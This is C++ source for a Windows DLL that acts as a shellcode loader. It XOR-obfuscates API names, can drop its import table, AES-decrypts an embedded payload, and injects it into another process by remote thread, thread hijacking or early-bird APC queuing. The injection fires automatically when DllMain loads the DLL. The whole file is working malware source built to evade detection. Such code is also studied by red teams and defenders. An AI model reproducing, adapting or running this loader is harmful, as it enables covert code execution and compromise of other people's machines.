#include <windows.h>
#include <tlhelp32.h>

#include "bin/cryptDef.h"

// #include <cstdio>


#ifdef NO_IMPORT_TABLE

#include "helpers.h"
#pragma comment(linker, "/entry:WinMain")

#endif


GetProcAddress_t pGetProcAddress;
GetModuleHandle_t pGetModuleHandle;

int AESDecrypt(char * payload, unsigned int payload_len, char * aesKey, size_t keylen) 
{	
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
		
	LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sLoadLibraryA);	
		
	HMODULE hModule = pLoadLibraryA(sAdvapi32DLL);
		
	CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t)pGetProcAddress(hModule, sCryptAcquireContextW);	
	if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	
	CryptCreateHash_t pCryptCreateHash  = (CryptCreateHash_t)pGetProcAddress(hModule, sCryptCreateHash);	
	if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	
	CryptHashData_t pCryptHashData  = (CryptHashData_t)pGetProcAddress(hModule, sCryptHashData);	
	if (!pCryptHashData(hHash, (BYTE*)aesKey, (DWORD)keylen, 0)){
			return -1;              
	}
	
	CryptDeriveKey_t pCryptDeriveKey  = (CryptDeriveKey_t)pGetProcAddress(hModule, sCryptDeriveKey);	
	if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
					
	CryptDecrypt_t pCryptDecrypt  = (CryptDecrypt_t)pGetProcAddress(hModule, sCryptDecrypt);	
	if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext_t pCryptReleaseContext  = (CryptReleaseContext_t)pGetProcAddress(hModule, sCryptReleaseContext);	
	pCryptReleaseContext(hProv, 0);
	
	CryptDestroyHash_t pCryptDestroyHash  = (CryptDestroyHash_t)pGetProcAddress(hModule, sCryptDestroyHash);	
	pCryptDestroyHash(hHash);
	
	CryptDestroyKey_t pCryptDestroyKey  = (CryptDestroyKey_t)pGetProcAddress(hModule, sCryptDestroyKey);	
	pCryptDestroyKey(hKey);
	
	return 0;
}


void XOR(char * data, size_t data_len, char * key, size_t key_len) 
{
	int j = 0;
	for (int i = 0; i < data_len; i++) 
	{
		if (j == key_len-1) 
			j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	
	data[data_len-1]='\0';
}


int FindTarget(const char *procname)
{	
	CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCreateToolhelp32Snapshot);
	HANDLE hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (INVALID_HANDLE_VALUE == hProcSnap)
		return 0;
		
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32); 
	
	CloseHandle_t pCloseHandle = (CloseHandle_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCloseHandle);
	
	Process32First_t pProcess32First = (Process32First_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sProcess32First);
	if (!pProcess32First(hProcSnap, &pe32)) 
	{
		pCloseHandle(hProcSnap);
		return 0;
	}
		
	int pid = 0;
	Process32Next_t pProcess32Next = (Process32Next_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sProcess32Next);
	while (pProcess32Next(hProcSnap, &pe32)) 
	{
		if (strcmp(procname, pe32.szExeFile) == 0) 
		{
			pid = pe32.th32ProcessID;
			break;
		}
	}
			
	pCloseHandle(hProcSnap);
			
	return pid;
}

// CREATE_REMOTE_THREAD
// THREAD_CONTEXT
// EARLY_BIRD
#define EARLY_BIRD

#ifdef CREATE_REMOTE_THREAD

HANDLE FindThread(int pid)
{
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
	
	CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCreateToolhelp32Snapshot);
    HANDLE Snap = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	Thread32Next_t pThread32Next = (Thread32Next_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sThread32Next);
	while (pThread32Next(Snap, &thEntry)) 
	{
		if (thEntry.th32OwnerProcessID == pid) 	
		{
			OpenThread_t pOpenThread = (OpenThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sOpenThread);
			hThread = pOpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	
	CloseHandle_t pCloseHandle = (CloseHandle_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCloseHandle);
	pCloseHandle(Snap);
	
	return hThread;
}

#endif


int Inject(int pid, HANDLE hProc, char * payload, int payload_len) 
{		

#ifdef CREATE_REMOTE_THREAD

	VirtualAllocEx_t pVirtualAllocEx  = (VirtualAllocEx_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAllocEx);	
	LPVOID pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sWriteProcessMemory);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
	
	CreateRemoteThread_t pCreateRemoteThread  = (CreateRemoteThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCreateRemoteThread);
	HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);	
		
	if (hThread != NULL) 
	{
		WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sWaitForSingleObject);
		pWaitForSingleObject(hThread, 500);
		
		CloseHandle_t pCloseHandle = (CloseHandle_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCloseHandle);
		pCloseHandle(hThread);
		return 0;
	}
	
#endif
#ifdef THREAD_CONTEXT

	// find a thread in target process
	HANDLE hThread = FindThread(pid);
	if (hThread == NULL)
		return -1;
	
	// perform payload injection
	VirtualAllocEx_t pVirtualAllocEx  = (VirtualAllocEx_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAllocEx);	
	LPVOID pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sWriteProcessMemory);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// execute the payload by hijacking a thread in target process
	SuspendThread_t pSuspendThread = (SuspendThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sSuspendThread);
	pSuspendThread(hThread);	

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext_t pGetThreadContext = (GetThreadContext_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sGetThreadContext);
	pGetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif

	SetThreadContext_t pSetThreadContext = (SetThreadContext_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sSetThreadContext);
	pSetThreadContext(hThread, &ctx);

	ResumeThread_t pResumeThread = (ResumeThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sResumeThread);	
	return pResumeThread(hThread);
	
#endif
	
	return -1;
}

// int main()
extern "C" __declspec(dllexport) int go() 
{
	XOR((char *) sKernel32DLL, sizeof(sKernel32DLL), XorKey, sizeof(XorKey));
	XOR((char *) sAdvapi32DLL, sizeof(sAdvapi32DLL), XorKey, sizeof(XorKey));
	XOR((char *) sGetProcAddress, sizeof(sGetProcAddress), XorKey, sizeof(XorKey));
	XOR((char *) sGetModuleHandleA, sizeof(sGetModuleHandleA), XorKey, sizeof(XorKey));
	XOR((char *) sOpenProcess, sizeof(sOpenProcess), XorKey, sizeof(XorKey));
	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), XorKey, sizeof(XorKey));
	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), XorKey, sizeof(XorKey));
	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), XorKey, sizeof(XorKey));
	XOR((char *) sLoadLibraryA, sizeof(sLoadLibraryA), XorKey, sizeof(XorKey));
	XOR((char *) sCloseHandle, sizeof(sCloseHandle), XorKey, sizeof(XorKey));
	XOR((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), XorKey, sizeof(XorKey));
	
	XOR((char *) sCryptAcquireContextW, sizeof(sCryptAcquireContextW), XorKey, sizeof(XorKey));
	XOR((char *) sCryptCreateHash, sizeof(sCryptCreateHash), XorKey, sizeof(XorKey));
	XOR((char *) sCryptHashData, sizeof(sCryptHashData), XorKey, sizeof(XorKey));
	XOR((char *) sCryptDeriveKey, sizeof(sCryptDeriveKey), XorKey, sizeof(XorKey));
	XOR((char *) sCryptDecrypt, sizeof(sCryptDecrypt), XorKey, sizeof(XorKey));
	XOR((char *) sCryptReleaseContext, sizeof(sCryptReleaseContext), XorKey, sizeof(XorKey));
	XOR((char *) sCryptDestroyHash, sizeof(sCryptDestroyHash), XorKey, sizeof(XorKey));
	XOR((char *) sCryptDestroyKey, sizeof(sCryptDestroyKey), XorKey, sizeof(XorKey));
	
	XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), XorKey, sizeof(XorKey));
	XOR((char *) sProcess32First, sizeof(sProcess32First), XorKey, sizeof(XorKey));
	XOR((char *) sProcess32Next, sizeof(sProcess32Next), XorKey, sizeof(XorKey));
	
	XOR((char *) sInjectionProcess, sizeof(sInjectionProcess), XorKey, sizeof(XorKey));	

	XOR((char *) sOpenThread, sizeof(sOpenThread), XorKey, sizeof(XorKey));	
	XOR((char *) sSuspendThread, sizeof(sSuspendThread), XorKey, sizeof(XorKey));	
	XOR((char *) sResumeThread, sizeof(sResumeThread), XorKey, sizeof(XorKey));	
	XOR((char *) sGetThreadContext, sizeof(sGetThreadContext), XorKey, sizeof(XorKey));	
	XOR((char *) sSetThreadContext, sizeof(sSetThreadContext), XorKey, sizeof(XorKey));	
	XOR((char *) sThread32Next, sizeof(sThread32Next), XorKey, sizeof(XorKey));	

	XOR((char *) sCreateProcessA, sizeof(sCreateProcessA), XorKey, sizeof(XorKey));	
	XOR((char *) sQueueUserAPC, sizeof(sQueueUserAPC), XorKey, sizeof(XorKey));	
	
#ifdef NO_IMPORT_TABLE

	pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetProcAddress);
	pGetModuleHandle = (GetModuleHandle_t) pGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetModuleHandleA);

#else

	pGetProcAddress=&GetProcAddress;
	pGetModuleHandle=&GetModuleHandleA;

#endif

#ifdef EARLY_BIRD

	int pid = 0;
    HANDLE hProc = NULL;
	
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	void * pRemoteCode;
	
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	CreateProcessA_t pCreateProcessA = (CreateProcessA_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCreateProcessA);
	pCreateProcessA(0, sInjectionProcess, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	int payload_len = sizeof(payload);

	// Decrypt and inject payload
	AESDecrypt((char *) payload, payload_len, (char *) AesKey, sizeof(AesKey));	

	// Allocate memory for payload and throw it in
	VirtualAllocEx_t pVirtualAllocEx  = (VirtualAllocEx_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAllocEx);	
	pRemoteCode = pVirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
		
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sWriteProcessMemory);
	pWriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sQueueUserAPC);
	pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, 0);
	
	ResumeThread_t pResumeThread = (ResumeThread_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sResumeThread);	
	pResumeThread(pi.hThread);

	return 0;

#else

	int payload_len = sizeof(payload);
		
	AESDecrypt((char *) payload, payload_len, AesKey, sizeof(AesKey));
		
	int pid = FindTarget(sInjectionProcess);
	
	if (pid) 
	{			
		OpenProcess_t pOpenProcess = (OpenProcess_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sOpenProcess);		
		HANDLE hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
	
		if (hProc != NULL) 
		{			
			Inject(pid, hProc, payload, payload_len);
			CloseHandle_t pCloseHandle = (CloseHandle_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sCloseHandle);
			pCloseHandle(hProc);
		}
	}
	return 0;

#endif

}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
	switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
			go();
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break; 
            }
            
            break;
    }
    return TRUE;
}